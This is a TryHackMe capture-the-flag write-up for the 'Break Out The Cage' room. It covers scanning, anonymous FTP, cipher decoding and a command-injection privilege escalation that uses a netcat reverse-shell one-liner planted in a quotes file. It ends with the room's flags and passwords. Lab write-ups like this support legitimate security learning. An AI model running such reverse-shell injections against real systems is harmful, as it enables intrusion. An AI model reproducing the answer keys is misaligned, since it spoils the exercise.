## Break Out The Cage - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/breakoutthecage1)

<i>Let's find out what his agent is up to....</i>

**IP: 10.10.13.81**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Decoding <br>

**Tools Used**: Nmap, Gobuster, Cipher Identifier

[Cipher Identifier](https://www.dcode.fr/cipher-identifier)<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Nmap and Gobuster as my birthright.

  ```
  nmap -Pn -sC -sV -T5 -p- 10.10.13.81 

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.8.120.52
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 2
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
  |   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
  |_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Nicholas Cage Stories
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.13.81 -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 276]
  /.htaccess            (Status: 403) [Size: 276]
  /.htpasswd            (Status: 403) [Size: 276]
  /contracts            (Status: 301) [Size: 314] [--> http://10.10.13.81/contracts/]
  /html                 (Status: 301) [Size: 309] [--> http://10.10.13.81/html/]
  /images               (Status: 301) [Size: 311] [--> http://10.10.13.81/images/]
  /index.html           (Status: 200) [Size: 2453]
  /scripts              (Status: 301) [Size: 312] [--> http://10.10.13.81/scripts/]
  /server-status        (Status: 403) [Size: 276]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  
  gobuster dir -u http://10.10.13.81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /images               (Status: 301) [Size: 311] [--> http://10.10.13.81/images/]
  /html                 (Status: 301) [Size: 309] [--> http://10.10.13.81/html/]
  /scripts              (Status: 301) [Size: 312] [--> http://10.10.13.81/scripts/]
  /contracts            (Status: 301) [Size: 314] [--> http://10.10.13.81/contracts/]
  /auditions            (Status: 301) [Size: 314] [--> http://10.10.13.81/auditions/]
  /server-status        (Status: 403) [Size: 276]
  Progress: 220560 / 220561 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- While Gobuster was enumeratig for the second time, I logged in with FTP as Anonymous. There I found a note which will give us Weston's password.

  ```
  ftp 10.10.13.81  
  Connected to 10.10.13.81.
  220 (vsFTPd 3.0.3)
  Name: Anonymous
  331 Please specify the password.
  Password: 
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /
  ftp> ls
  229 Entering Extended Passive Mode (|||22619|)
  150 Here comes the directory listing.
  -rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
  226 Directory send OK.
  ftp> get dad_tasks
  local: dad_tasks remote: dad_tasks
  229 Entering Extended Passive Mode (|||31214|)
  150 Opening BINARY mode data connection for dad_tasks (396 bytes).
  100% |************************************************************************|   396      105.83 KiB/s    00:00 ETA
  226 Transfer complete.
  396 bytes received in 00:00 (7.23 KiB/s)
  ftp> exit
  221 Goodbye.
  ```

  ```
  cat dad_tasks    
  UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds 
  
  cat dad_tasks|base64 -d
  Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
  Sfw. Kajnmb xsi owuowge
  Faz. Tml fkfr qgseik ag oqeibx
  Eljwx. Xil bqi aiklbywqe
  Rsfv. Zwel vvm imel sumebt lqwdsfk
  Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.
  
  Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
  ```
  
- Yeaaaah.... Decode the Base64 and then put new output into Cipher Identifier. It's Vigenere Cipher and the key is `KEY`.

  ```
  Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
  One. Revamp the website
  Two. Put more quotes in script
  Three. Buy bee pesticide
  Four. Help him with acting lessons
  Five. Teach Dad what "information security" is.
  
  In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes 
  ```

- Now we have credentials for SSH. I also explored through web app, beside bunch of useless scripts, I found nothing except the `.mp3` file in `/auditions` directory. IF YOU ARE A REAL HACKER YOU WILL LISTEN TO IT !!! lulz 🤣

- Log in, setup a putty shell and let's go!

---

## ⚙️ Shell Access and User Privilege Escalation

- OK, right now I got in with `weston` user and here I spent a lot of time on trying to find way to root or cage user. I am not going to write all the commands that I did, I'll just post what worked for me sicne I experimented a lot ngl.
  The key is in those random quotes that randomly shows in the terminal.

  ```
  Broadcast message from cage@national-treasure (somewhere) (Sat May 10 13:27:01 
                                                                               
  Everything I take is prescription - except for the heroin. — Bad Lieutenant: Port Of Call

  Broadcast message from cage@national-treasure (somewhere) (Sat May 10 13:24:01 
                                                                               
  I love pressure. I eat it for breakfast. — The Rock
  ```

- Quotes are sick tho but let's get back to work. We are in group `cage` so i checked all the files related to it. There's two files, a Python script that runs these quotes each minute or so and the list of quotes.

  ```
  weston@national-treasure:~$ id
  uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
  
  weston@national-treasure:~$ find / -type f -group cage 2>/dev/null
  /opt/.dads_scripts/spread_the_quotes.py
  /opt/.dads_scripts/.files/.quotes
  
  weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py 
  #!/usr/bin/env python
  
  #Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
  import os
  import random
  
  lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
  quote = random.choice(lines)
  os.system("wall " + quote)
  ```
  
- You can also run `sudo -l` and `cat /usr/bin/bees` to confirm that they are all connected. Since we don't have permission to edit the script in any way, our only option is to edit the quotes list. Let's put reverse shell inside and start a listener.
  I found this one liner but you can use any reverse shell that you like.

  ```
  weston@national-treasure:/$ sudo -l
  [sudo] password for weston: 
  Matching Defaults entries for weston on national-treasure:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User weston may run the following commands on national-treasure:
      (root) /usr/bin/bees
  weston@national-treasure:/$ cat /usr/bin/bees 
  #!/bin/bash
  
  wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
  
  weston@national-treasure:/$ file /usr/bin/bees 
  /usr/bin/bees: Bourne-Again shell script, ASCII text executable
  ```

  ```
  nc -lvnp 4444

  weston@national-treasure:~$ echo "hehexd;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 4444 >/tmp/f" > /opt/.dads_scripts/.files/.quotes 
                                                                               
  Broadcast message from cage@national-treasure (somewhere) (Sat May 10 13:57:01 
                                                                                 
  hehexd

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.13.81] 41378
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  cage
  $ id
  uid=1000(cage) gid=1000(cage) groups=1000(cage),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
  ```

- Wait a bit for new quote to spawn and you'll have a reverse shell. Spawn a putty shell then get the first flag.

  ```
  cage@national-treasure:~$ ls -al
  total 56
  drwx------ 7 cage cage 4096 May 26  2020 .
  drwxr-xr-x 4 root root 4096 May 26  2020 ..
  lrwxrwxrwx 1 cage cage    9 May 26  2020 .bash_history -> /dev/null
  -rw-r--r-- 1 cage cage  220 Apr  4  2018 .bash_logout
  -rw-r--r-- 1 cage cage 3771 Apr  4  2018 .bashrc
  drwx------ 2 cage cage 4096 May 25  2020 .cache
  drwxrwxr-x 2 cage cage 4096 May 25  2020 email_backup
  drwx------ 3 cage cage 4096 May 25  2020 .gnupg
  drwxrwxr-x 3 cage cage 4096 May 25  2020 .local
  -rw-r--r-- 1 cage cage  807 Apr  4  2018 .profile
  -rw-rw-r-- 1 cage cage   66 May 25  2020 .selected_editor
  drwx------ 2 cage cage 4096 May 26  2020 .ssh
  -rw-r--r-- 1 cage cage    0 May 25  2020 .sudo_as_admin_successful
  -rw-rw-r-- 1 cage cage  230 May 26  2020 Super_Duper_Checklist
  -rw------- 1 cage cage 6761 May 26  2020 .viminfo
  
  cage@national-treasure:~$ cat Super_Duper_Checklist 
  1 - Increase acting lesson budget by at least 30%
  2 - Get Weston to stop wearing eye-liner
  3 - Get a new pet octopus
  4 - Try and keep current wife
  5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
  ```

- That took a while, now for the root flag.

---

## 👑 Root Privilege Escalation

- This one is pretty easy. In one of the emails found in the `email_backup` directory there's a secret password. I'm gonna let you find it on your own, this is the string you are looking for `haiinspsyanileph`.

  ```
  cage@national-treasure:~/email_backup$ cat email_?????
  From - Cage@nationaltreasure.com
  To - Weston@nationaltreasure.com
  
  Hey Son
  
  Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
  down what it said. Could you look into it please? I think it could be something to do with his
  account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
  sure he's out to get me. The note said:
  
  [******************]
  
  The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
  was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
  hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
  ahahahhahaha. Ahhh Face it... he's just odd. 
  
  Regards
  
  The Legend - Cage
  ```
  
- Of course it's decoded, I tried using it as root password but didn't work at all, so I moved to decoding. The cipher here is Vigenere Cipher and the key is `face`.

  ```
  haiinspsyanileph -> cageisnotalegend
  ```
  
- Now, I tried new string as password for root and it worked!

  ```
  cage@national-treasure:~/email_backup$ su root
  Password: 
  root@national-treasure:/home/cage/email_backup# cd /root
  root@national-treasure:~# ls -al
  total 52
  drwx------  8 root root  4096 May 26  2020 .
  drwxr-xr-x 24 root root  4096 May 26  2020 ..
  lrwxrwxrwx  1 root root     9 May 26  2020 .bash_history -> /dev/null
  -rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
  drwx------  2 root root  4096 May 26  2020 .cache
  drwxr-xr-x  2 root root  4096 May 25  2020 email_backup
  drwx------  3 root root  4096 May 26  2020 .gnupg
  drwxr-xr-x  3 root root  4096 May 25  2020 .local
  -rw-r--r--  1 root root   148 Aug 17  2015 .profile
  drwx------  2 root root  4096 May 25  2020 .ssh
  drwxr-xr-x  2 root root  4096 May 26  2020 .vim
  -rw-------  1 root root 11692 May 26  2020 .viminfo
  root@national-treasure:~# 
  ```

- LEGOOOOOOOOOOOOOOO! Now I'm gonna let you find last flag on your own, use the same principle as in previous step where we got encoded root password. Flag starts with `THM{}`.

- I had so much fun with this challenge, was laughing during the whole hacking process — loved it! Thank you, Magna! 👑 See ya in the next one!

---

## 🏁 Flags

- **Westons Password**: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`
- **User Flag**: `THM{M37AL_0R_P3N_T35T1NG}`
- **Root Flag**: `THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding my way around with users.`

- What did I learn?
  `Some new privilege escalation techniques alongside sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
